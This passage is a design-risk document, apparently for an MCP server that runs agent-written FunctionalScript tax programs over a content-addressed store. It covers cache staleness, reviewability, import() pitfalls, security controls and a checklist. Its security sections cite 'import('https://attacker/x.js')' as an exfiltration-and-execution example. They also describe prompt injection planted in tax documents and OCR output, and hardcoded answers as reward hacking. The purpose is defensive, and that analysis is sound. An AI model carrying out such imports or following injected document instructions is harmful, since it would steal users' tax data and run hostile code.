- Add `~/.cas`-equivalent paths to `.gitignore` and verify. A CAS directory accidentally committed to a public repo is unrecoverable in the same way.
- **Distinguish "document identity" from "document content" explicitly in the subject model.** Content hash answers "are these bytes the same." Subject answers "is this the same 1099." Do not let a report program use a content hash as an identity.

**Warning signs:**
- The demo uses the real `~/.cas` shared with FunctionalScript's own tooling.
- Two 1099s in the store resolve to the same hash and nobody noticed.
- Anyone asks "how do I remove that."

**Phase to address:** **Week 1**, Track B, alongside open question 2. Retroactive fixes here are not fixes.

---

### Pitfall 11: The Evo head cache goes stale via the out-of-band `cas add` path — which is the path large PDFs must use

**What goes wrong:**
Evo's head index is an **in-memory cache**, built by scanning the whole store once (`initEvo` → `buildCache`) and kept current only for writes that flow through the running server. `cas_add` handles this correctly — it calls `syncRevision` on every write, so a revision stored via the generic CAS tool still updates the cache.

But read the `cas_add` tool description in the vendored source:

> *"Inline content is capped at 128 KiB (131072 bytes) — larger content is rejected. For larger content, store the file with the `cas` CLI instead: run `npx functionalscript cas add <path>` yourself if you have shell access, or give the user that exact command to run."*

That path writes to the store **from a different process**. The running MCP server's in-memory cache never learns about it. `evo_head` will not see it until the server restarts.

This collides head-on with a stated requirement: *"Store raw PDF statement bytes without parsing them."* Real bank and brokerage PDFs are routinely 100 KB–2 MB, and base64 inflates by 4/3, so **the primary ingestion path for the project's own raw-PDF requirement is the out-of-band CLI**. Symptom: a document the user "just uploaded" is invisible to the report program, intermittently, depending on whether it went through the server or the CLI, and on whether the server has been restarted since.

**Why it happens:**
The cache is correct and well-documented; the 128 KiB cap is documented; the interaction between them is documented in neither place because they live in different modules.

**How to avoid:**
- **Expose a `cas_refresh` / re-scan tool** (or re-scan on `evo_list`/`evo_head` when a store-mtime changed). Cheap, and it makes the out-of-band path safe.
- Better for Week 1: **do not ingest raw PDFs through the agent at all.** The plan's actual v1 ingestion path is vision → `vnd.fjs.*` JSON → `evo_add`, and that JSON is far under 128 KiB. Store the raw PDF via the CLI as an *archival* artifact whose hash is referenced by the document revision, and accept that the raw blob is not itself a head. Say this explicitly so nobody builds a PDF upload tool that silently truncates at 128 KiB.
- Document in the server's tool descriptions that a CLI-added blob requires a refresh. The agent will otherwise conclude the document does not exist and re-ingest it — creating a duplicate revision chain.

**Warning signs:**
- "I uploaded it but the report says there's no 1099."
- Restarting the MCP server changes a report's output. That is the signature.
- Any tool that accepts a base64 PDF body.

**Phase to address:** **Week 1**, Track B. Verify in Week 4 by adding a document via the CLI mid-session and asserting the server sees it.

---

### Pitfall 12: Reviewability is asserted, not delivered — a program nobody reads is a number with extra steps

**What goes wrong:**
The Core Value is: *"A generated number is opaque and unverifiable; a generated program is reviewable, re-runnable, diffable, and storable."* Three of those four are structural properties the architecture genuinely delivers. **Reviewable is not.** It is a claim about a human activity that the architecture makes *possible* and does nothing to make *likely*.

The failure mode is subtle wrongness rather than obvious breakage — which is precisely the case the brief asks about. Consider a program that:

- uses `>` where the statute says `>=` on a bracket boundary (off-by-one at exactly the threshold; invisible unless a test lands on the boundary);
- filters 1099-INT by `box1` but silently drops a document where the field is named `interestIncome`;
- applies the standard deduction before an above-the-line adjustment;
- sums `heads[0]` per subject and misses a second head.

All of these produce a number that is right to within a few hundred dollars, on a form where a few hundred dollars is a normal amount. Re-running reproduces it. Diffing shows nothing because there is no prior version. Storage in CAS records it faithfully. The program is a perfect, durable, auditable record of a wrong answer.

**Does having a program instead of a number help here?** Honestly: **partially, and less than the framing implies.**

*It genuinely helps in three ways:* (1) the error is *localizable* — you can find the `>` and fix it, where a wrong number gives you nothing to inspect; (2) it is *stable* — the same program gives the same wrong answer, so a fix is verifiable, whereas re-asking an LLM gives you a different wrong answer each time and no way to tell if you fixed anything; (3) it is *testable* — you can run it against a filed return, and TaxCalcBench's central finding (frontier models compute under a third of returns correctly, with consistent tax-table misuse) is exactly the argument for putting a testable artifact in the loop instead of a model's arithmetic.

*It does not help at all in one way, and this is the honest limit of the thesis:* it converts a verification task the user **cannot** do (check an LLM's arithmetic) into one they **also cannot do** (review generated FunctionalScript over a content-addressed store). For a taxpayer who is not a FunctionalScript programmer, the audit story is aspirational. The verification burden did not shrink; it moved, and it moved toward *more* expertise, not less. That is fine here — the stated users are the authors, who are FunctionalScript's own developers — but it should be named, because it is the constraint that decides whether this design ever generalizes beyond them.

**How to avoid:**
- **Make the program's own output self-explaining.** Every emitted line carries its source hashes *and* the rule/worksheet line it implements. Then a reviewer checks a table of `line ← rule ← sources`, which is a tractable review, instead of reading code, which is not.
- **Test the boundaries, because that is where subtle wrongness lives.** For every threshold in the parameter data, generate `proof` cases at `threshold - 1`, `threshold`, `threshold + 1` cents. This catches the `>` vs `>=` class mechanically and is the single highest-value test investment in the project.
- **Keep a golden fixture set that asserts every intermediate line, not just the final number.** `opentax-engine` uses 279 such fixtures; the principle scales down. A wrong intermediate that happens to cancel out is the worst possible outcome.
- **Differential-test against an independent engine** on synthetic cases (PolicyEngine US, OpenTaxSolver). Disagreements are cheap to triage and catch whole classes of misreading.
- Store programs as revisions of a *subject* so successive versions are genuinely diffable. If each report is a fresh unrelated blob, the "diffable" claim is unrealized.

**Warning signs:**
- The acceptance test is "the total matched" rather than "every line matched."
- No test case sits exactly on a bracket, phase-out, or threshold boundary.
- Nobody has read a generated program end to end.

**Phase to address:** **Week 2** for boundary proofs and self-explaining output shape. **Week 4** for line-by-line acceptance against the real filed return.

---

### Pitfall 13: How a stored blob actually becomes an imported module — three verified mechanics the spec does not cover

**What goes wrong:**
`fjs_run` is specified as "read blob → `import()` → call entry point." Three mechanics of that step are load-bearing and unaddressed. All verified locally on Node 23.11:

*(a) A `data:` URL module cannot resolve bare specifiers.*
```js
await import('data:text/javascript;base64,' + b64("import { pure } from 'functionalscript/fjs/effects/module.f.js' …"))
// ERR_UNSUPPORTED_RESOLVE_REQUEST: Failed to resolve module specifier
//   "functionalscript/…" from "data:…": Invalid relative URL or base scheme is not hierarchical.
```
A blob with no imports works fine from a `data:` URL. But an agent-authored program almost certainly wants `pure`, `step`, list helpers, and the `Cents` module. So `data:` — the obvious "don't touch the filesystem" choice — **forces every program to be dependency-free**, or forces a module-customization hook / import map. Pick deliberately; do not discover this while implementing.

*(b) The ESM module cache is keyed by URL and never evicts.* Importing identical source twice runs the top-level body **once** (verified: 2 imports → 1 execution). Consequences: re-running the same program hash is genuinely cheap; but if you materialize blobs to a **reused temp filename**, the second run silently executes the **first** program. Name materialized files by content hash — which the CAS gives you for free — and this becomes a feature. Also note there is no un-import: a bad module stays resident for the session.

*(c) The import path is the one place a program can reach outside the whitelist by design.* If a program's `import` specifiers are ever resolved from program-controlled strings, `import('https://attacker/x.js')` is both exfiltration and execution in one line, entirely outside the effect layer. **Pin the resolution surface**: allow only `functionalscript/*` and the project's own upstreamable helpers; reject everything else *before* materializing the module.

**Why it happens:**
"Read blob → `import()`" reads like one step. It is three decisions (URL scheme, materialization/caching, specifier policy), each with a wrong default.

**How to avoid:**
- Materialize to `<casHome>/run/<hash>.mjs` — content-hash-named, inside the `--permission` allow-list, cache-safe by construction.
- Decide and document the allowed import surface, and enforce it with a textual specifier check *before* import. This is a genuinely cheap and genuinely effective partial mitigation for Pitfall 1: it does not stop `fs.rmSync` (already-imported `node:fs`… which the specifier check also blocks), but it blocks the remote-fetch variant entirely, and it is ~20 lines rather than a parser.
- Record the decision in `fjs/todo/implement-mcp-server.md` — it belongs next to the entry-point question already open there.

**Warning signs:**
- The first generated program that imports anything fails with `ERR_UNSUPPORTED_RESOLVE_REQUEST` and someone "fixes" it by writing to a fixed temp path.
- Any specifier reaching `import()` that was not checked against an allow-list.

**Phase to address:** **Week 1**, Track A step 4.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|---|---|---|---|
| Unrestricted `import()` with full Node privileges | Saves ~1 week in Week 1; no parser, no IPC, no isolation plumbing | Full user-privilege RCE reachable from any document the agent reads; becomes a hard blocker the moment a second user, a shared machine, or a hosted transport appears | Week 1 only, **and only with** `--permission`, a pinned import surface, and a written input-provenance rule. Never on the stated "trusted user" grounds alone |
| Plain-object `OperationMap` passed straight to `match` | It is what fjs's own examples do | The advertised sandbox does not exist; guarantees false confidence when `import()` is later closed | **Never** — the fix is one line and is already scheduled as the "clean refusal" task |
| Rate-schedule math for line 16 | Simple, matches every blog explanation, "obviously right" | Fails Success Criterion 1 by $1–$12 on most returns, and the error propagates to every downstream line | Never for the acceptance target. Acceptable in a Week 2 throwaway aggregate that does not compute line 16 |
| Dollars as JS `number` | Reads naturally, no new type | Silent cent-level drift; retrofitting `Cents` after report programs exist means rewriting all of them | Never. The type costs an hour in Week 1 |
| `fjs_run({ hash })` with heads resolved inside the program | Simplest possible tool signature | Reproducibility (Criterion 4) becomes unachievable; the signature change is breaking once programs exist | Never — resolve this in Week 1 with open question 5 |
| Inline `fjs_run` results (not written back to CAS) | Keeps `fjs_run` read-only; no CAS write in the whitelist | Traceability (Criterion 3) stays best-effort; no permanent audit trail; harder to diff report versions | Acceptable through Week 2 while the report shape churns; revisit before Week 4's end-to-end run |
| One `magi` variable | Less code | Wrong for at least one rule, and the wrongness is invisible | Never |
| Raw PDFs via out-of-band `cas add` CLI | Sidesteps the 128 KiB inline cap immediately | Stale head cache, "I uploaded it but it's not there," duplicate revision chains | Acceptable if paired with a refresh tool and documented in the tool descriptions |
| No timeout on `fjs_run` | One less thing in Week 1 | Any bad generated loop bricks the session with no error | Acceptable for the first two days of Week 1; a step budget is ~5 lines |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|---|---|---|
| **MCP stdio transport** | Anything written to stdout that is not JSON-RPC corrupts the stream and drops the connection. This is the single most common MCP bug, and it catches everyone once. The project's launcher is a plain impure `.js` file — the highest-risk place for a stray `console.log` | **All logging to stderr, without exception.** Verify with `node server.js > out.txt 2>/dev/null` and assert every line of `out.txt` parses as JSON. Make it a CI check, not a habit |
| **MCP tool errors** | Returning bare strings like `"error: not found"`. Agents cannot tell whether to retry, ask the user, switch tools, or stop — producing 3–5 retry cycles of ~2,000 tokens each versus 0–1 with structured errors | Every `errorResult` states *what went wrong*, *what was expected*, and *a correct example*. `operation not permitted: fetch — this runner allows only [cas_read, evo_head]; read documents through cas_read instead` is recoverable. `TypeError: map[command] is not a function` is not |
| **`match` throwing out of a tool handler** | An `OperationMap` miss throws a raw `TypeError` from inside `asyncRun`. If `fjs_run`'s handler does not catch it, the rejection escapes the handler and may take down the transport rather than returning a tool error | Wrap the entire run in a catch that converts *any* throw — including non-`Error` values, which FunctionalScript code can throw — into `errorResult` with the program hash included |
| **fjs `mcpStep` lifecycle** | Assuming you must implement `initialize` / `notifications/initialized` / `ping` / `-32002` yourself | Verified: `fjs/protocol/mcp/module.f.js` already handles the full lifecycle correctly, ignores unknown notifications, and provides `isError` tool results. Compose it; do not reimplement it |
| **Tool count and description overlap** | Composing `casToolRegistry` (3) + `evoToolRegistry` (4) + finance tools yields ~10–15 tools with overlapping semantics (`cas_add` vs `evo_add` both "store a thing"). Overlapping descriptions are the top cause of agents calling the wrong tool | Write tool descriptions that say *when not* to use each one. `cas_add` should say "for raw content only; to store a document use `evo_add`." Consider not exposing raw `cas_add` at all in v1 |
| **`claude mcp add` launcher** | Registering `node server.js` and later trying to add `--permission` — flags belong in the registered command | Register with the permission flags from day one, so the safe configuration is the only one anyone has |

---

## Performance Traps

Calibrated to this project's actual scale — a single person's tax records. Most classic CAS scaling worries do not apply and should not be engineered for.

| Trap | Symptoms | Prevention | When it breaks |
|---|---|---|---|
| `initEvo`/`buildCache` reads **every blob** in the store on startup | MCP server takes seconds to become responsive; client may time out the handshake | Keep raw PDFs in a separate store from revisions, or accept it. `decodeRevisionBlob` streams and UTF-8-decodes every blob, including every PDF | ~100 MB of stored PDFs, i.e. a few hundred statements. Reachable in year 2–3 of real use |
| `headsOf` is O(hashes × parents); `union` is O(n²) via `Array.includes` | Nothing, at personal scale | **Do not optimize.** A few thousand revisions is microseconds. Flagged here only so nobody mistakes it for a problem | Tens of thousands of revisions — not this project |
| No module cache eviction in a long-lived stdio server | Slow memory growth across a long session | Restart between sessions; ignore otherwise | Hundreds of distinct programs in one session |
| Unbounded `fjs_run` execution | Server stops responding entirely | Step budget + wall clock (Pitfall 4) | First bad generated loop — i.e. week one of real use |
| 128 KiB inline `cas_add` cap | Large uploads rejected with a message the agent may not surface clearly | Route documents through vision → JSON (small); route raw PDFs through the CLI | Immediately, for any real PDF |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---|---|---|
| Treating "single local user" as the security boundary | The untrusted party is the *document*, not the user. Full RCE from a phished "corrected 1099" | Name the document as the untrusted input in the constraint text. Compensating controls: `--permission`, pinned import surface, input-provenance rule |
| Relying on the `OperationMap` as an isolation mechanism without an own-property guard | Verified escape from a one-operation whitelist via `__defineGetter__` | `Object.create(null)` **and** `Object.hasOwn` guard. Report upstream |
| Closing `import()` in Week 5 without fixing `match` | A "sandboxed" runner that a five-line program escapes — worse than the honest hole, because it will be trusted | Fix `match` first; it is Week 1 work already on the board |
| Storing tax documents in the shared `~/.cas` | An append-only, undeletable, unencrypted store of SSNs and account numbers, co-mingled with other tooling | Project-local CAS home; full-disk encryption as a documented prerequisite; verified `.gitignore` |
| Allowing program-controlled `import()` specifiers | `import('https://attacker/x.js')` = exfiltration + execution, entirely outside the effect layer | Textual allow-list on specifiers before materializing the module |
| Assuming `--permission` blocks network | Node's documented permission surface covers fs, child processes, worker threads, native addons, WASI, and the inspector — **not network**. Exfiltration of the whole tax record remains open | Treat exfiltration as unmitigated in-process. Close it at the OS level (container / `sandbox-exec` / egress rule) or accept it explicitly |
| Vision-pass output treated as trusted structured data | The injection is now *inside* a `vnd.fjs.1099` blob and gets a second, better shot at the agent when it authors the program | Strip or escape anything imperative-looking from OCR output before storing. Consider storing the raw vision output separately (open question 3) so the narrowed document contains only typed fields, never free text |
| Auto-approving `fjs_run` | The one tool whose whole job is executing generated code is the one you most want a human on | Do not put `fjs_run` on an auto-approve list during Weeks 1–4 |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---|---|---|
| Presenting the computed 1040 as an answer rather than a reviewed estimate | The user transcribes a wrong number onto a filed return. This is the actual harm this project can cause | Every result states the year, the parameter-set hash, the program hash, and "review against your documents before filing." `todo/plan.md` open question 1 already asks whether output is authoritative — answer "reviewed estimate," in writing, in the output |
| Silently picking `heads[0]` when a subject has several | The report is computed from a superseded 1099 and looks completely normal | Refuse and ask. Ambiguity about *which version of a tax document* is never a good place for a default |
| Reporting a total with no line detail | The user cannot check anything, which is the failure the project exists to prevent | Emit every line with its sources, even when the user asked one question |
| Errors phrased for the developer | The agent retries blindly and burns the session; the user sees churn and no progress | Error text is read by an LLM that must decide what to do next. Write it as an instruction |
| No indication that a re-run used different inputs | The user believes they reproduced a result when they recomputed a new one | Echo pinned input hashes in every result and diff them against the prior run |
| Silence during a long `fjs_run` | Indistinguishable from a hang | Bound it, and say so on timeout |

---

## "Looks Done But Isn't" Checklist

- [ ] **Restricted runner:** often missing prototype-name refusal — verify `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `__defineGetter__` are all refused, not just `fetch`/`readFile`
- [ ] **Restricted runner:** often missing a step budget and deadline — verify `while(true){}` in a generated program returns an error rather than hanging
- [ ] **`fjs_run`:** often missing input pinning — verify the same program hash + same input hashes gives byte-identical output *after* an amended revision has been added to the subject
- [ ] **`fjs_run`:** often missing total error capture — verify a program that throws a non-`Error` value returns `errorResult`, not a dropped connection
- [ ] **`fjs_run`:** often missing a specifier allow-list — verify `import('https://…')` and `import('node:fs')` are rejected before materialization
- [ ] **Line 16:** often computed from brackets — verify against the **printed Tax Table** for a sub-$100,000 case, and against the QDCGT worksheet for a case with qualified dividends
- [ ] **Rounding:** often applied per-item — verify `round(sum(cents))`, not `sum(round(cents))`, on a line aggregating 10+ documents with real cents
- [ ] **Rounding:** often unspecified for negatives — verify the chosen rule has a `proof` and that `Math.round` appears nowhere
- [ ] **Money:** often a bare `number` — grep for `.toFixed(`, `parseFloat(`, `Math.round(` in `fjs/`; all three should be absent from tax logic
- [ ] **Thresholds:** often untested at the boundary — verify a `proof` at `threshold − 1¢`, `threshold`, `threshold + 1¢` for every threshold in the parameter data
- [ ] **Traceability:** often best-effort — verify a report line cannot be constructed without source hashes (make it a type error, then confirm the compiler enforces it)
- [ ] **Non-hardcoding:** often unverified — verify that perturbing one input document changes the output, and that the run performed a non-zero number of CAS reads
- [ ] **Evo cache:** often stale — verify a document added via `npx functionalscript cas add` mid-session is visible to `evo_head` without a restart
- [ ] **stdio:** often polluted — verify stdout contains only JSON-RPC across a full session, as a CI assertion
- [ ] **Multi-head:** often ignored — verify a subject with two heads produces a refusal, not a silent pick
- [ ] **Retraction:** often absent — verify there is a documented answer to "I uploaded the wrong document"
- [ ] **Permission model:** often unregistered — verify the `claude mcp add` command line actually carries `--permission` and the allow-list paths

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---|---|---|
| `import()` hole exploited | **CATASTROPHIC** | Assume total compromise of the user's account: rotate every credential, assume the tax data is exfiltrated, rebuild the machine. There is no partial recovery. This is why the ratio, not the probability, drives the decision |
| `match` prototype escape found in the wild | LOW to fix, HIGH to trust | One-line fix; but every program run before the fix must be treated as having had full access |
| Line 16 computed from brackets | LOW | Tax Table as data + re-run. Programs are pure and re-runnable — this is the case where the architecture genuinely pays off |
| Money stored as float dollars | **MEDIUM–HIGH** | Every report program and every stored document dialect must be revised. Cheap in Week 1, expensive after Week 3. Do it first |
| `fjs_run({hash})` shipped without input pinning | MEDIUM | Breaking signature change plus a rewrite of every program written against it |
| Wrong subject model chosen | **HIGH** | Every stored revision must be migrated; the CAS has no delete, so old subjects linger forever. `todo/plan.md` calls this "annoying to change" — it is worse than that |
| Private document mis-ingested | **HIGH** | No delete exists. Either accept a permanent copy or destroy and rebuild the store, losing all history. Mitigate in advance with a project-local store |
| Stale Evo cache | LOW | Restart the server; add a refresh tool |
| Runaway program hangs the server | LOW | Kill and restart, losing session state. Add the step budget so this stops recurring |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---|---|---|
| 1. `import()` justified against the wrong threat | **Week 1** (controls) / **Week 5** (isolation) | `--permission` flags present in the registered launcher; a test blob whose module body calls `fs.rmSync` gets `ERR_ACCESS_DENIED`; input-provenance rule written into `AGENTS.md` |
| 2. `djs/parser` cannot validate programs | **Week 1** (docs correction) | The claim is removed from all three planning documents and replaced with the isolation plan |
| 3. `match` reaches `Object.prototype` — **RESOLVED in fjs 0.41.0** (#1419) | **Week 1** Track A step 3 — now only the *reporting* half | A `proof` asserting `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `__defineGetter__`, and `fetch` all yield `operation not permitted`. Still worth writing as regression cover |
| 4. No step limit / timeout | **Week 1** Track A step 4 | A `proof` that a non-terminating effect chain returns a bounded error |
| 5. Tax Table vs rate schedule | **Week 2** | Line 16 matches the printed table for a sub-$100,000 case with real cents; a QDCGT case matches the worksheet |
| 6. Float currency and rounding | **Week 1** (`Cents` + rounding fn) / **Week 2** (round-only-the-total) | Boundary proofs on the rounding function including negatives; `.toFixed`/`Math.round`/`parseFloat` absent from tax logic |
| 7. Head resolution breaks reproducibility | **Week 1** (`fjs_run` signature, open question 5) | **Week 4:** add an amended revision between two runs of a pinned program; output is identical |
| 8. Program hardcodes the answer | **Week 1** (report shape + effect counting) / **Week 2** (perturbation gate) | Every report program run reports a non-zero CAS-read count; perturbing an input changes the output |
| 9. Phase-out ordering and MAGI add-backs | **Week 3** | One named function per IRS worksheet with matching line numbers; no variable named `magi`; differential check against PolicyEngine/OpenTaxSolver |
| 10. CAS has no delete | **Week 1** Track B (with open question 2) | Project-local store; documented retraction story via `archived`; `.gitignore` verified |
| 11. Stale Evo cache via CLI ingestion | **Week 1** Track B | **Week 4:** CLI-add a blob mid-session; `evo_head` sees it without restart |
| 12. Reviewability asserted, not delivered | **Week 2** (boundary proofs, self-explaining output) / **Week 4** (line-by-line acceptance) | Golden fixtures assert every intermediate line, not just totals; every threshold has ±1¢ proofs |
| 13. `import()` mechanics (data: URLs, cache, specifiers) | **Week 1** Track A step 4 | Content-hash-named materialization; specifier allow-list enforced pre-import |

**Suggested ordering consequence for the roadmap:** Pitfalls 2, 3, 6, 7, and 13 are all **Week 1** items that become materially more expensive after report programs exist, and four of them are already adjacent to tasks on the Week 1 board (the "clean refusal" task *is* the `match` fix; the `fjs_run` signature question *is* the reproducibility fix). Pitfall 2 is a documentation correction that should happen before anything else, because it invalidates a plan three documents depend on.

---

## Sources

**Verified locally against the vendored `functionalscript@0.40.0` and executed on Node 23.11 (project CI targets Node 26):**
- `fjs/effects/module.f.js:282` — `match`'s bracket lookup; prototype reachability and the `__defineGetter__` escalation reproduced end to end
- `fjs/effects/module.js` — `asyncRun`'s unbounded `while (true)`
- `fjs/djs/ast/module.f.js`, `fjs/djs/parser/module.f.js` — DJS is data-only; functions are an explicit upstream TODO
- `fjs/js/`, `fjs/fsc/`, `fjs/bnf/` — no JavaScript/FunctionalScript parser exists in 0.40.0
- `fjs/cas/module.f.d.ts` — `Cas` is `read`/`write`/`list`; no delete
- `fjs/cas/evo/module.f.js` — `headsOf` returns an array; `buildCache` reads every blob; `syncRevision` covers `cas_add` but not out-of-band CLI writes
- `fjs/mcp/cas/module.f.js` — the 128 KiB inline cap and the documented CLI escape hatch
- `fjs/protocol/mcp/module.f.js` — lifecycle, `-32002`, `isError` handled correctly upstream
- `fjs/types/bigfloat/` — not a decimal type; no money type exists in fjs
- Node behaviour: `Math.round(-2.5) === -2`; `1.005 * 100 === 100.49999999999999`; `(1.005).toFixed(2) === "1.00"`; `data:` URL bare-specifier resolution fails with `ERR_UNSUPPORTED_RESOLVE_REQUEST`; ESM cache runs a body once per URL; `--permission` denies fs read/write and `child_process` to an imported module's top-level body

**Tax authority (HIGH confidence):**
- [IRS Instructions for Form 1040 (2025)](https://www.irs.gov/instructions/i1040gi) — rounding rule; line 16 method selection and the $100,000 Tax Table threshold
- [IRS Publication 590-A](https://www.irs.gov/publications/p590a) — Worksheet 1-1 MAGI add-backs; Appendix B worksheets for the IRA-deduction / taxable-Social-Security circularity

**Tax engineering practice (MEDIUM–HIGH):**
- [TaxCalcBench: Evaluating Frontier Models on the Tax Calculation Task](https://arxiv.org/abs/2507.16126) (Column Tax) — frontier models compute under a third of federal returns correctly; consistent tax-table misuse, arithmetic errors, eligibility errors
- [opentax-engine](https://github.com/Invaro/opentax-engine) — bigint-cents invariant; exact reproduction of the printed Tax Table verified against 41 sampled rows; 279 golden fixtures asserting every intermediate; §32(i) EITC cliff; refusal over plausible-guessing
- [PolicyEngine US / TAXSIM cross-validation](https://www.policyengine.org/us/taxsim) — differential validation as established practice
- [How to simplify the IRS tax tables](https://analytica.com/blog/how-to-simplify-the-irs-tax-tables/) — worked midpoint example: $18,000 MFJ → $1,803 table vs $1,800 bracket math

**LLM code-execution and injection (MEDIUM; threat landscape, dated 2025–2026):**
- [OWASP: MCP Tool Poisoning](https://owasp.org/www-community/attacks/MCP_Tool_Poisoning); [Invariant Labs: MCP Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks); [CyberArk: Poison everywhere](https://www.cyberark.com/resources/threat-research-blog/poison-everywhere-no-output-from-your-mcp-server-is-safe)
- [Cloud Security Alliance: Indirect Prompt Injection in the Wild (2026)](https://labs.cloudsecurityalliance.org/research/csa-research-note-indirect-prompt-injection-in-the-wild-2026/) — document-embedded injections; OpenClaw incident; Proofpoint invoice injections; Google crawl statistics
- [Are AI-assisted Development Tools Immune to Prompt Injection?](https://arxiv.org/abs/2603.21642) — agent hijack via PR titles with secret exfiltration
- [Node.js vm module is not a security mechanism](https://offensive360.com/blog/nodejs-vm-module-security-risks/); [vm2 sandbox escape CVE wave](https://www.kodemsecurity.com/resources/vm2-sandbox-escape-vulnerabilities-the-2026-cve-wave-turning-ai-agents-into-host-rce-vectors) — in-process JS sandboxes are not boundaries; LLM output is the documented initial-execution vector
- [Node.js Permissions documentation](https://nodejs.org/api/permissions.html) — stable since v23.5.0; covers fs, child processes, worker threads, native addons, WASI, inspector; **no network permission**

**LLM code-quality failure modes (MEDIUM):**
- [ImpossibleBench](https://www.lesswrong.com/posts/qJYMbrabcQqCZ7iqm/impossiblebench-measuring-reward-hacking-in-llm-coding-1); [EvilGenie](https://arxiv.org/abs/2511.21654); [SpecBench](https://arxiv.org/pdf/2605.21384) — hardcoding expected values as the canonical reward-hacking strategy
- [PL techniques for bridging LLM code generation semantic gaps](https://arxiv.org/abs/2507.09135) — plausible-but-wrong code as the dominant residual failure

**MCP server engineering (MEDIUM):**
- [Structured errors in MCP](https://blog.stackademic.com/structured-errors-in-mcp-designing-failure-surfaces-the-agent-can-actually-recover-from-344ddf21324f) — recovery-oriented error design and the retry-cost measurements
- [stdio transport: log output on stdout breaks MCP JSON-RPC](https://github.com/dirmacs/daedra/issues/4) — real instance of the most common MCP bug
- [MCP server anti-patterns (2026)](https://www.digitalapplied.com/blog/mcp-server-anti-patterns-design-mistakes-2026-developer-guide) — tool-count and overlapping-description failure modes

---
*Pitfalls research for: MCP + CAS + agent-authored program execution for US personal income tax*
*Researched: 2026-08-03*
